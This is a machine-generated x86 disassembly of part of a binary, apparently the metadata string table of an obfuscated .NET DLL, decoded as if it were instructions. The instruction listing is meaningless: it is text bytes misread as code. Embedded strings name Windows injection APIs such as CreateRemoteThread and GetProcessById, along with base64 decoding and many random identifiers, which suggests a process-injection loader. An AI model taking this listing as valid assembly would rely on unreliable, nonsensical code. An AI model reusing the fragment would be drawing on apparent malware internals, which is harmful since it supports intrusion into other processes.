10002bc5:	6b 48 00 5a          	imul   $0x5a,0x0(%eax),%ecx
10002bc9:	58                   	pop    %eax
10002bca:	74 52                	je     0x10002c1e
10002bcc:	50                   	push   %eax
10002bcd:	79 31                	jns    0x10002c00
10002bcf:	48                   	dec    %eax
10002bd0:	31 70 7a             	xor    %esi,0x7a(%eax)
10002bd3:	56                   	push   %esi
10002bd4:	49                   	dec    %ecx
10002bd5:	44                   	inc    %esp
10002bd6:	46                   	inc    %esi
10002bd7:	44                   	inc    %esp
10002bd8:	58                   	pop    %eax
10002bd9:	47                   	inc    %edi
10002bda:	42                   	inc    %edx
10002bdb:	70 45                	jo     0x10002c22
10002bdd:	49                   	dec    %ecx
10002bde:	00 51 59             	add    %dl,0x59(%ecx)
10002be1:	66 7a 57             	data16 jp 0x10002c3b
10002be4:	71 61                	jno    0x10002c47
10002be6:	45                   	inc    %ebp
10002be7:	6d                   	insl   (%dx),%es:(%edi)
10002be8:	63 62 69             	arpl   %esp,0x69(%edx)
10002beb:	76 34                	jbe    0x10002c21
10002bed:	4a                   	dec    %edx
10002bee:	00 56 79             	add    %dl,0x79(%esi)
10002bf1:	66 4d                	dec    %bp
10002bf3:	6c                   	insb   (%dx),%es:(%edi)
10002bf4:	66 74 72             	data16 je 0x10002c69
10002bf7:	36 54                	ss push %esp
10002bf9:	73 4b                	jae    0x10002c46
10002bfb:	50                   	push   %eax
10002bfc:	4b                   	dec    %ebx
10002bfd:	00 50 70             	add    %dl,0x70(%eax)
10002c00:	48                   	dec    %eax
10002c01:	53                   	push   %ebx
10002c02:	6b 4f 35 57          	imul   $0x57,0x35(%edi),%ecx
10002c06:	68 36 47 55 37       	push   $0x37554736
10002c0b:	44                   	inc    %esp
10002c0c:	51                   	push   %ecx
10002c0d:	4f                   	dec    %edi
10002c0e:	6b 35 62 6c 4b 00 52 	imul   $0x52,0x4b6c62,%esi
10002c15:	78 4e                	js     0x10002c65
10002c17:	6b 7a 77 45          	imul   $0x45,0x77(%edx),%edi
10002c1b:	6f                   	outsl  %ds:(%esi),(%dx)
10002c1c:	57                   	push   %edi
10002c1d:	48                   	dec    %eax
10002c1e:	66 70 35             	data16 jo 0x10002c56
10002c21:	62 6a 73             	bound  %ebp,0x73(%edx)
10002c24:	78 6f                	js     0x10002c95
10002c26:	7a 64                	jp     0x10002c8c
10002c28:	50                   	push   %eax
10002c29:	6b 4d 00 50          	imul   $0x50,0x0(%ebp),%ecx
10002c2d:	52                   	push   %edx
10002c2e:	4f                   	dec    %edi
10002c2f:	43                   	inc    %ebx
10002c30:	45                   	inc    %ebp
10002c31:	53                   	push   %ebx
10002c32:	53                   	push   %ebx
10002c33:	5f                   	pop    %edi
10002c34:	49                   	dec    %ecx
10002c35:	4e                   	dec    %esi
10002c36:	46                   	inc    %esi
10002c37:	4f                   	dec    %edi
10002c38:	52                   	push   %edx
10002c39:	4d                   	dec    %ebp
10002c3a:	41                   	inc    %ecx
10002c3b:	54                   	push   %esp
10002c3c:	49                   	dec    %ecx
10002c3d:	4f                   	dec    %edi
10002c3e:	4e                   	dec    %esi
10002c3f:	00 53 54             	add    %dl,0x54(%ebx)
10002c42:	41                   	inc    %ecx
10002c43:	52                   	push   %edx
10002c44:	54                   	push   %esp
10002c45:	55                   	push   %ebp
10002c46:	50                   	push   %eax
10002c47:	49                   	dec    %ecx
10002c48:	4e                   	dec    %esi
10002c49:	46                   	inc    %esi
10002c4a:	4f                   	dec    %edi
10002c4b:	00 53 79             	add    %dl,0x79(%ebx)
10002c4e:	73 74                	jae    0x10002cc4
10002c50:	65 6d                	gs insl (%dx),%es:(%edi)
10002c52:	2e 49                	cs dec %ecx
10002c54:	4f                   	dec    %edi
10002c55:	00 41 77             	add    %al,0x77(%ecx)
10002c58:	4d                   	dec    %ebp
10002c59:	47                   	inc    %edi
10002c5a:	71 4f                	jno    0x10002cab
10002c5c:	6d                   	insl   (%dx),%es:(%edi)
10002c5d:	79 31                	jns    0x10002c90
10002c5f:	6a 74                	push   $0x74
10002c61:	6c                   	insb   (%dx),%es:(%edi)
10002c62:	35 39 45 4e 62       	xor    $0x624e4539,%eax
10002c67:	36 71 70             	ss jno 0x10002cda
10002c6a:	50                   	push   %eax
10002c6b:	00 41 52             	add    %al,0x52(%ecx)
10002c6e:	78 55                	js     0x10002cc5
10002c70:	6a 52                	push   $0x52
10002c72:	49                   	dec    %ecx
10002c73:	4d                   	dec    %ebp
10002c74:	4e                   	dec    %esi
10002c75:	59                   	pop    %ecx
10002c76:	33 53 58             	xor    0x58(%ebx),%edx
10002c79:	36 69 51 00 55 57 59 	imul   $0x52595755,%ss:0x0(%ecx),%edx
10002c80:	52 
10002c81:	47                   	inc    %edi
10002c82:	46                   	inc    %esi
10002c83:	70 31                	jo     0x10002cb6
10002c85:	65 62 42 54          	bound  %eax,%gs:0x54(%edx)
10002c89:	38 53 4d             	cmp    %dl,0x4d(%ebx)
10002c8c:	51                   	push   %ecx
10002c8d:	53                   	push   %ebx
10002c8e:	00 52 56             	add    %dl,0x56(%edx)
10002c91:	68 57 68 49 52       	push   $0x52496857
10002c96:	42                   	inc    %edx
10002c97:	48                   	dec    %eax
10002c98:	46                   	inc    %esi
10002c99:	36 38 6a 77          	cmp    %ch,%ss:0x77(%edx)
10002c9d:	73 55                	jae    0x10002cf4
10002c9f:	75 43                	jne    0x10002ce4
10002ca1:	78 74                	js     0x10002d17
10002ca3:	71 66                	jno    0x10002d0b
10002ca5:	4c                   	dec    %esp
10002ca6:	33 54 00 48          	xor    0x48(%eax,%eax,1),%edx
10002caa:	48                   	dec    %eax
10002cab:	42                   	inc    %edx
10002cac:	56                   	push   %esi
10002cad:	6b 6d 78 77          	imul   $0x77,0x78(%ebp),%ebp
10002cb1:	6e                   	outsb  %ds:(%esi),(%dx)
10002cb2:	4f                   	dec    %edi
10002cb3:	4c                   	dec    %esp
10002cb4:	52                   	push   %edx
10002cb5:	76 62                	jbe    0x10002d19
10002cb7:	71 55                	jno    0x10002d0e
10002cb9:	00 4d 72             	add    %cl,0x72(%ebp)
10002cbc:	42                   	inc    %edx
10002cbd:	53                   	push   %ebx
10002cbe:	4a                   	dec    %edx
10002cbf:	71 48                	jno    0x10002d09
10002cc1:	30 66 63             	xor    %ah,0x63(%esi)
10002cc4:	32 54 53 65          	xor    0x65(%ebx,%edx,2),%dl
10002cc8:	36 68 6f 68 51 71    	ss push $0x7151686f
10002cce:	4c                   	dec    %esp
10002ccf:	67 45                	addr16 inc %ebp
10002cd1:	61                   	popa
10002cd2:	56                   	push   %esi
10002cd3:	00 48 73             	add    %cl,0x73(%eax)
10002cd6:	77 73                	ja     0x10002d4b
10002cd8:	46                   	inc    %esi
10002cd9:	71 6e                	jno    0x10002d49
10002cdb:	43                   	inc    %ebx
10002cdc:	73 76                	jae    0x10002d54
10002cde:	6a 6a                	push   $0x6a
10002ce0:	70 56                	jo     0x10002d38
10002ce2:	00 58 52             	add    %bl,0x52(%eax)
10002ce5:	47                   	inc    %edi
10002ce6:	69 45 6c 55 6d 70 5a 	imul   $0x5a706d55,0x6c(%ebp),%eax
10002ced:	6f                   	outsl  %ds:(%esi),(%dx)
10002cee:	6e                   	outsb  %ds:(%esi),(%dx)
10002cef:	44                   	inc    %esp
10002cf0:	6c                   	insb   (%dx),%es:(%edi)
10002cf1:	57                   	push   %edi
10002cf2:	00 64 77 58          	add    %ah,0x58(%edi,%esi,2)
10002cf6:	00 64 77 59          	add    %ah,0x59(%edi,%esi,2)
10002cfa:	00 4f 6f             	add    %cl,0x6f(%edi)
10002cfd:	6e                   	outsb  %ds:(%esi),(%dx)
10002cfe:	58                   	pop    %eax
10002cff:	48                   	dec    %eax
10002d00:	6e                   	outsb  %ds:(%esi),(%dx)
10002d01:	68 6c 4a 72 6b       	push   $0x6b724a6c
10002d06:	66 30 67 51          	data16 xor %ah,0x51(%edi)
10002d0a:	52                   	push   %edx
10002d0b:	33 61 00             	xor    0x0(%ecx),%esp
10002d0e:	4e                   	dec    %esi
10002d0f:	47                   	inc    %edi
10002d10:	51                   	push   %ecx
10002d11:	66 63 53 68          	arpl   %dx,0x68(%ebx)
10002d15:	31 38                	xor    %edi,(%eax)
10002d17:	54                   	push   %esp
10002d18:	6b 45 67 31          	imul   $0x31,0x67(%ebp),%eax
10002d1c:	47                   	inc    %edi
10002d1d:	62 00                	bound  %eax,(%eax)
10002d1f:	63 62 00             	arpl   %esp,0x0(%edx)
10002d22:	6d                   	insl   (%dx),%es:(%edi)
10002d23:	73 63                	jae    0x10002d88
10002d25:	6f                   	outsl  %ds:(%esi),(%dx)
10002d26:	72 6c                	jb     0x10002d94
10002d28:	69 62 00 4a 76 66 65 	imul   $0x6566764a,0x0(%edx),%esp
10002d2f:	6a 45                	push   $0x45
10002d31:	64 47                	fs inc %edi
10002d33:	6a 6f                	push   $0x6f
10002d35:	39 43 55             	cmp    %eax,0x55(%ebx)
10002d38:	32 39                	xor    (%ecx),%bh
10002d3a:	79 38                	jns    0x10002d74
10002d3c:	34 70                	xor    $0x70,%al
10002d3e:	62 00                	bound  %eax,(%eax)
10002d40:	47                   	inc    %edi
10002d41:	4b                   	dec    %ebx
10002d42:	53                   	push   %ebx
10002d43:	4f                   	dec    %edi
10002d44:	6e                   	outsb  %ds:(%esi),(%dx)
10002d45:	59                   	pop    %ecx
10002d46:	67 56                	addr16 push %esi
10002d48:	66 7a 7a             	data16 jp 0x10002dc5
10002d4b:	68 72 4b 75 76       	push   $0x76754b72
10002d50:	62 00                	bound  %eax,(%eax)
10002d52:	53                   	push   %ebx
10002d53:	79 73                	jns    0x10002dc8
10002d55:	74 65                	je     0x10002dbc
10002d57:	6d                   	insl   (%dx),%es:(%edi)
10002d58:	2e 43                	cs inc %ebx
10002d5a:	6f                   	outsl  %ds:(%esi),(%dx)
10002d5b:	6c                   	insb   (%dx),%es:(%edi)
10002d5c:	6c                   	insb   (%dx),%es:(%edi)
10002d5d:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
10002d62:	6e                   	outsb  %ds:(%esi),(%dx)
10002d63:	73 2e                	jae    0x10002d93
10002d65:	47                   	inc    %edi
10002d66:	65 6e                	outsb  %gs:(%esi),(%dx)
10002d68:	65 72 69             	gs jb  0x10002dd4
10002d6b:	63 00                	arpl   %eax,(%eax)
10002d6d:	47                   	inc    %edi
10002d6e:	65 74 50             	gs je  0x10002dc1
10002d71:	72 6f                	jb     0x10002de2
10002d73:	63 65 73             	arpl   %esp,0x73(%ebp)
10002d76:	73 42                	jae    0x10002dba
10002d78:	79 49                	jns    0x10002dc3
10002d7a:	64 00 47 65          	add    %al,%fs:0x65(%edi)
10002d7e:	74 45                	je     0x10002dc5
10002d80:	78 69                	js     0x10002deb
10002d82:	74 43                	je     0x10002dc7
10002d84:	6f                   	outsl  %ds:(%esi),(%dx)
10002d85:	64 65 54             	fs gs push %esp
10002d88:	68 72 65 61 64       	push   $0x64616572
10002d8d:	00 43 72             	add    %al,0x72(%ebx)
10002d90:	65 61                	gs popa
10002d92:	74 65                	je     0x10002df9
10002d94:	52                   	push   %edx
10002d95:	65 6d                	gs insl (%dx),%es:(%edi)
10002d97:	6f                   	outsl  %ds:(%esi),(%dx)
10002d98:	74 65                	je     0x10002dff
10002d9a:	54                   	push   %esp
10002d9b:	68 72 65 61 64       	push   $0x64616572
10002da0:	00 41 64             	add    %al,0x64(%ecx)
10002da3:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
10002da7:	74 5f                	je     0x10002e08
10002da9:	48                   	dec    %eax
10002daa:	61                   	popa
10002dab:	73 45                	jae    0x10002df2
10002dad:	78 69                	js     0x10002e18
10002daf:	74 65                	je     0x10002e16
10002db1:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
10002db5:	70 6c                	jo     0x10002e23
10002db7:	61                   	popa
10002db8:	63 65 00             	arpl   %esp,0x0(%ebp)
10002dbb:	45                   	inc    %ebp
10002dbc:	6e                   	outsb  %ds:(%esi),(%dx)
10002dbd:	75 6d                	jne    0x10002e2c
10002dbf:	65 72 61             	gs jb  0x10002e23
10002dc2:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
10002dc6:	43                   	inc    %ebx
10002dc7:	6c                   	insb   (%dx),%es:(%edi)
10002dc8:	6f                   	outsl  %ds:(%esi),(%dx)
10002dc9:	73 65                	jae    0x10002e30
10002dcb:	48                   	dec    %eax
10002dcc:	61                   	popa
10002dcd:	6e                   	outsb  %ds:(%esi),(%dx)
10002dce:	64 6c                	fs insb (%dx),%es:(%edi)
10002dd0:	65 00 66 69          	add    %ah,%gs:0x69(%esi)
10002dd4:	6c                   	insb   (%dx),%es:(%edi)
10002dd5:	65 00 45 59          	add    %al,%gs:0x59(%ebp)
10002dd9:	74 70                	je     0x10002e4b
10002ddb:	46                   	inc    %esi
10002ddc:	4b                   	dec    %ebx
10002ddd:	39 69 77             	cmp    %ebp,0x77(%ecx)
10002de0:	68 30 7a 64 6f       	push   $0x6f647a30
10002de5:	65 00 56 61          	add    %dl,%gs:0x61(%esi)
10002de9:	6c                   	insb   (%dx),%es:(%edi)
10002dea:	75 65                	jne    0x10002e51
10002dec:	54                   	push   %esp
10002ded:	79 70                	jns    0x10002e5f
10002def:	65 00 57 68          	add    %dl,%gs:0x68(%edi)
10002df3:	65 72 65             	gs jb  0x10002e5b
10002df6:	00 53 79             	add    %dl,0x79(%ebx)
10002df9:	73 74                	jae    0x10002e6f
10002dfb:	65 6d                	gs insl (%dx),%es:(%edi)
10002dfd:	2e 43                	cs inc %ebx
10002dff:	6f                   	outsl  %ds:(%esi),(%dx)
10002e00:	72 65                	jb     0x10002e67
10002e02:	00 43 6f             	add    %al,0x6f(%ebx)
10002e05:	6d                   	insl   (%dx),%es:(%edi)
10002e06:	70 69                	jo     0x10002e71
10002e08:	6c                   	insb   (%dx),%es:(%edi)
10002e09:	65 72 47             	gs jb  0x10002e53
10002e0c:	65 6e                	outsb  %gs:(%esi),(%dx)
10002e0e:	65 72 61             	gs jb  0x10002e72
10002e11:	74 65                	je     0x10002e78
10002e13:	64 41                	fs inc %ecx
10002e15:	74 74                	je     0x10002e8b
10002e17:	72 69                	jb     0x10002e82
10002e19:	62 75 74             	bound  %esi,0x74(%ebp)
10002e1c:	65 00 47 75          	add    %al,%gs:0x75(%edi)
10002e20:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
10002e27:	62 
10002e28:	75 74                	jne    0x10002e9e
10002e2a:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
10002e2f:	75 67                	jne    0x10002e98
10002e31:	67 61                	addr16 popa
10002e33:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
10002e37:	74 74                	je     0x10002ead
10002e39:	72 69                	jb     0x10002ea4
10002e3b:	62 75 74             	bound  %esi,0x74(%ebp)
10002e3e:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
10002e42:	6d                   	insl   (%dx),%es:(%edi)
10002e43:	56                   	push   %esi
10002e44:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
10002e4b:	74 74                	je     0x10002ec1
10002e4d:	72 69                	jb     0x10002eb8
10002e4f:	62 75 74             	bound  %esi,0x74(%ebp)
10002e52:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002e56:	73 65                	jae    0x10002ebd
10002e58:	6d                   	insl   (%dx),%es:(%edi)
10002e59:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
10002e5d:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
10002e64:	72 
10002e65:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
10002e6c:	73 73                	jae    0x10002ee1
10002e6e:	65 6d                	gs insl (%dx),%es:(%edi)
10002e70:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
10002e74:	72 61                	jb     0x10002ed7
10002e76:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
10002e79:	61                   	popa
10002e7a:	72 6b                	jb     0x10002ee7
10002e7c:	41                   	inc    %ecx
10002e7d:	74 74                	je     0x10002ef3
10002e7f:	72 69                	jb     0x10002eea
10002e81:	62 75 74             	bound  %esi,0x74(%ebp)
10002e84:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
10002e89:	67 65 74 46          	addr16 gs je 0x10002ed3
10002e8d:	72 61                	jb     0x10002ef0
10002e8f:	6d                   	insl   (%dx),%es:(%edi)
10002e90:	65 77 6f             	gs ja  0x10002f02
10002e93:	72 6b                	jb     0x10002f00
10002e95:	41                   	inc    %ecx
10002e96:	74 74                	je     0x10002f0c
10002e98:	72 69                	jb     0x10002f03
10002e9a:	62 75 74             	bound  %esi,0x74(%ebp)
10002e9d:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002ea1:	73 65                	jae    0x10002f08
10002ea3:	6d                   	insl   (%dx),%es:(%edi)
10002ea4:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
10002ea8:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
10002eaf:	69 
10002eb0:	6f                   	outsl  %ds:(%esi),(%dx)
10002eb1:	6e                   	outsb  %ds:(%esi),(%dx)
10002eb2:	41                   	inc    %ecx
10002eb3:	74 74                	je     0x10002f29
10002eb5:	72 69                	jb     0x10002f20
10002eb7:	62 75 74             	bound  %esi,0x74(%ebp)
10002eba:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002ebe:	73 65                	jae    0x10002f25
10002ec0:	6d                   	insl   (%dx),%es:(%edi)
10002ec1:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
10002ec5:	6f                   	outsl  %ds:(%esi),(%dx)
10002ec6:	6e                   	outsb  %ds:(%esi),(%dx)
10002ec7:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
10002ecd:	74 69                	je     0x10002f38
10002ecf:	6f                   	outsl  %ds:(%esi),(%dx)
10002ed0:	6e                   	outsb  %ds:(%esi),(%dx)
10002ed1:	41                   	inc    %ecx
10002ed2:	74 74                	je     0x10002f48
10002ed4:	72 69                	jb     0x10002f3f
10002ed6:	62 75 74             	bound  %esi,0x74(%ebp)
10002ed9:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002edd:	73 65                	jae    0x10002f44
10002edf:	6d                   	insl   (%dx),%es:(%edi)
10002ee0:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
10002ee4:	65 73 63             	gs jae 0x10002f4a
10002ee7:	72 69                	jb     0x10002f52
10002ee9:	70 74                	jo     0x10002f5f
10002eeb:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
10002ef2:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
10002ef9:	6f                   	outsl  %ds:(%esi),(%dx)
10002efa:	6d                   	insl   (%dx),%es:(%edi)
10002efb:	70 69                	jo     0x10002f66
10002efd:	6c                   	insb   (%dx),%es:(%edi)
10002efe:	61                   	popa
10002eff:	74 69                	je     0x10002f6a
10002f01:	6f                   	outsl  %ds:(%esi),(%dx)
10002f02:	6e                   	outsb  %ds:(%esi),(%dx)
10002f03:	52                   	push   %edx
10002f04:	65 6c                	gs insb (%dx),%es:(%edi)
10002f06:	61                   	popa
10002f07:	78 61                	js     0x10002f6a
10002f09:	74 69                	je     0x10002f74
10002f0b:	6f                   	outsl  %ds:(%esi),(%dx)
10002f0c:	6e                   	outsb  %ds:(%esi),(%dx)
10002f0d:	73 41                	jae    0x10002f50
10002f0f:	74 74                	je     0x10002f85
10002f11:	72 69                	jb     0x10002f7c
10002f13:	62 75 74             	bound  %esi,0x74(%ebp)
10002f16:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002f1a:	73 65                	jae    0x10002f81
10002f1c:	6d                   	insl   (%dx),%es:(%edi)
10002f1d:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
10002f21:	72 6f                	jb     0x10002f92
10002f23:	64 75 63             	fs jne 0x10002f89
10002f26:	74 41                	je     0x10002f69
10002f28:	74 74                	je     0x10002f9e
10002f2a:	72 69                	jb     0x10002f95
10002f2c:	62 75 74             	bound  %esi,0x74(%ebp)
10002f2f:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002f33:	73 65                	jae    0x10002f9a
10002f35:	6d                   	insl   (%dx),%es:(%edi)
10002f36:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
10002f3a:	6f                   	outsl  %ds:(%esi),(%dx)
10002f3b:	70 79                	jo     0x10002fb6
10002f3d:	72 69                	jb     0x10002fa8
10002f3f:	67 68 74 41 74 74    	addr16 push $0x74744174
10002f45:	72 69                	jb     0x10002fb0
10002f47:	62 75 74             	bound  %esi,0x74(%ebp)
10002f4a:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002f4e:	73 65                	jae    0x10002fb5
10002f50:	6d                   	insl   (%dx),%es:(%edi)
10002f51:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
10002f55:	6f                   	outsl  %ds:(%esi),(%dx)
10002f56:	6d                   	insl   (%dx),%es:(%edi)
10002f57:	70 61                	jo     0x10002fba
10002f59:	6e                   	outsb  %ds:(%esi),(%dx)
10002f5a:	79 41                	jns    0x10002f9d
10002f5c:	74 74                	je     0x10002fd2
10002f5e:	72 69                	jb     0x10002fc9
10002f60:	62 75 74             	bound  %esi,0x74(%ebp)
10002f63:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
10002f67:	6e                   	outsb  %ds:(%esi),(%dx)
10002f68:	74 69                	je     0x10002fd3
10002f6a:	6d                   	insl   (%dx),%es:(%edi)
10002f6b:	65 43                	gs inc %ebx
10002f6d:	6f                   	outsl  %ds:(%esi),(%dx)
10002f6e:	6d                   	insl   (%dx),%es:(%edi)
10002f6f:	70 61                	jo     0x10002fd2
10002f71:	74 69                	je     0x10002fdc
10002f73:	62 69 6c             	bound  %ebp,0x6c(%ecx)
10002f76:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
10002f7d:	69 
10002f7e:	62 75 74             	bound  %esi,0x74(%ebp)
10002f81:	65 00 53 69          	add    %dl,%gs:0x69(%ebx)
10002f85:	7a 65                	jp     0x10002fec
10002f87:	4f                   	dec    %edi
10002f88:	66 00 46 66          	data16 add %al,0x66(%esi)
10002f8c:	53                   	push   %ebx
10002f8d:	43                   	inc    %ebx
10002f8e:	42                   	inc    %edx
10002f8f:	4c                   	dec    %esp
10002f90:	71 73                	jno    0x10003005
10002f92:	59                   	pop    %ecx
10002f93:	34 32                	xor    $0x32,%al
10002f95:	43                   	inc    %ebx
10002f96:	34 67                	xor    $0x67,%al
10002f98:	00 53 70             	add    %dl,0x70(%ebx)
10002f9b:	50                   	push   %eax
10002f9c:	66 4b                	dec    %bx
10002f9e:	58                   	pop    %eax
10002f9f:	6c                   	insb   (%dx),%es:(%edi)
10002fa0:	52                   	push   %edx
10002fa1:	4b                   	dec    %ebx
10002fa2:	76 6f                	jbe    0x10003013
10002fa4:	62 45 70             	bound  %eax,0x70(%ebp)
10002fa7:	69 56 70 39 67 00 49 	imul   $0x49006739,0x70(%esi),%edx
10002fae:	62 56 5a             	bound  %edx,0x5a(%esi)
10002fb1:	4b                   	dec    %ebx
10002fb2:	53                   	push   %ebx
10002fb3:	32 44 31 38          	xor    0x38(%ecx,%esi,1),%al
10002fb7:	47                   	inc    %edi
10002fb8:	6c                   	insb   (%dx),%es:(%edi)
10002fb9:	49                   	dec    %ecx
10002fba:	42                   	inc    %edx
10002fbb:	73 6c                	jae    0x10003029
10002fbd:	34 50                	xor    $0x50,%al
10002fbf:	36 32 6c 6d 67       	xor    %ss:0x67(%ebp,%ebp,2),%ch
10002fc4:	00 53 79             	add    %dl,0x79(%ebx)
10002fc7:	73 74                	jae    0x1000303d
10002fc9:	65 6d                	gs insl (%dx),%es:(%edi)
10002fcb:	2e 54                	cs push %esp
10002fcd:	68 72 65 61 64       	push   $0x64616572
10002fd2:	69 6e 67 00 45 6e 63 	imul   $0x636e4500,0x67(%esi),%ebp
10002fd9:	6f                   	outsl  %ds:(%esi),(%dx)
10002fda:	64 69 6e 67 00 53 79 	imul   $0x73795300,%fs:0x67(%esi),%ebp
10002fe1:	73 
10002fe2:	74 65                	je     0x10003049
10002fe4:	6d                   	insl   (%dx),%es:(%edi)
10002fe5:	2e 52                	cs push %edx
10002fe7:	75 6e                	jne    0x10003057
10002fe9:	74 69                	je     0x10003054
10002feb:	6d                   	insl   (%dx),%es:(%edi)
10002fec:	65 2e 56             	gs cs push %esi
10002fef:	65 72 73             	gs jb  0x10003065
10002ff2:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
10002ff9:	46                   	inc    %esi
10002ffa:	72 6f                	jb     0x1000306b
10002ffc:	6d                   	insl   (%dx),%es:(%edi)
10002ffd:	42                   	inc    %edx
10002ffe:	61                   	popa
10002fff:	73 65                	jae    0x10003066
10003001:	36 34 53             	ss xor $0x53,%al
10003004:	74 72                	je     0x10003078
10003006:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
1000300d:	53                   	push   %ebx
1000300e:	74 72                	je     0x10003082
10003010:	69 6e 67 00 4e 46 74 	imul   $0x74464e00,0x67(%esi),%ebp
10003017:	75 73                	jne    0x1000308c
10003019:	77 68                	ja     0x10003083
1000301b:	4c                   	dec    %esp
1000301c:	74 59                	je     0x10003077
1000301e:	42                   	inc    %edx
1000301f:	59                   	pop    %ecx
10003020:	63 4d 38             	arpl   %ecx,0x38(%ebp)
10003023:	4b                   	dec    %ebx
10003024:	45                   	inc    %ebp
10003025:	7a 4e                	jp     0x10003075
10003027:	44                   	inc    %esp
10003028:	6c                   	insb   (%dx),%es:(%edi)
10003029:	64 34 68             	fs xor $0x68,%al
1000302c:	00 48 4b             	add    %cl,0x4b(%eax)
1000302f:	4a                   	dec    %edx
10003030:	62 78 4e             	bound  %edi,0x4e(%eax)
10003033:	46                   	inc    %esi
10003034:	4d                   	dec    %ebp
10003035:	5a                   	pop    %edx
10003036:	43                   	inc    %ebx
10003037:	39 44 4b 68          	cmp    %eax,0x68(%ebx,%ecx,2)
1000303b:	00 50 61             	add    %dl,0x61(%eax)
1000303e:	74 68                	je     0x100030a8
10003040:	00 53 5a             	add    %dl,0x5a(%ebx)
10003043:	49                   	dec    %ecx
10003044:	71 78                	jno    0x100030be
10003046:	42                   	inc    %edx
10003047:	37                   	aaa
10003048:	4b                   	dec    %ebx
10003049:	32 64 42 47          	xor    0x47(%edx,%eax,2),%ah
1000304d:	7a 71                	jp     0x100030c0
1000304f:	4c                   	dec    %esp
10003050:	4c                   	dec    %esp
10003051:	48                   	dec    %eax
10003052:	68 32 77 79 49       	push   $0x49797732
10003057:	34 6a                	xor    $0x6a,%al
10003059:	00 45 79             	add    %al,0x79(%ebp)
1000305c:	5a                   	pop    %edx
1000305d:	79 62                	jns    0x100030c1
1000305f:	74 53                	je     0x100030b4
10003061:	39 6c 4c 44          	cmp    %ebp,0x44(%esp,%ecx,2)
10003065:	64 73 78             	fs jae 0x100030e0
10003068:	4e                   	dec    %esi
10003069:	6a 32                	push   $0x32
1000306b:	67 31 56 56          	xor    %edx,0x56(%bp)
1000306f:	66 72 6b             	data16 jb 0x100030dd
10003072:	00 51 57             	add    %dl,0x57(%ecx)
10003075:	57                   	push   %edi
10003076:	73 56                	jae    0x100030ce
10003078:	6e                   	outsb  %ds:(%esi),(%dx)
10003079:	4c                   	dec    %esp
1000307a:	4b                   	dec    %ebx
1000307b:	4b                   	dec    %ebx
1000307c:	78 49                	js     0x100030c7
1000307e:	74 36                	je     0x100030b6
10003080:	4e                   	dec    %esi
10003081:	42                   	inc    %edx
10003082:	4b                   	dec    %ebx
10003083:	6f                   	outsl  %ds:(%esi),(%dx)
10003084:	37                   	aaa
10003085:	49                   	dec    %ecx
10003086:	58                   	pop    %eax
10003087:	55                   	push   %ebp
10003088:	6c                   	insb   (%dx),%es:(%edi)
10003089:	00 4d 61             	add    %cl,0x61(%ebp)
1000308c:	72 73                	jb     0x10003101
1000308e:	68 61 6c 00 6b       	push   $0x6b006c61
10003093:	65 72 6e             	gs jb  0x10003104
10003096:	65 6c                	gs insb (%dx),%es:(%edi)
10003098:	33 32                	xor    (%edx),%esi
1000309a:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
1000309d:	6c                   	insb   (%dx),%es:(%edi)
1000309e:	00 53 64             	add    %dl,0x64(%ebx)
100030a1:	74 68                	je     0x1000310b
100030a3:	77 4d                	ja     0x100030f2
100030a5:	52                   	push   %edx
100030a6:	39 34 57             	cmp    %esi,(%edi,%edx,2)
100030a9:	56                   	push   %esi
100030aa:	6e                   	outsb  %ds:(%esi),(%dx)
100030ab:	58                   	pop    %eax
100030ac:	79 2e                	jns    0x100030dc
100030ae:	64 6c                	fs insb (%dx),%es:(%edi)
100030b0:	6c                   	insb   (%dx),%es:(%edi)
100030b1:	00 4b 69             	add    %cl,0x69(%ebx)
100030b4:	6c                   	insb   (%dx),%es:(%edi)
100030b5:	6c                   	insb   (%dx),%es:(%edi)
100030b6:	00 53 79             	add    %dl,0x79(%ebx)
100030b9:	73 74                	jae    0x1000312f
100030bb:	65 6d                	gs insl (%dx),%es:(%edi)
100030bd:	00 52 61             	add    %dl,0x61(%edx)
100030c0:	6e                   	outsb  %ds:(%esi),(%dx)
100030c1:	64 6f                	outsl  %fs:(%esi),(%dx)
100030c3:	6d                   	insl   (%dx),%es:(%edi)
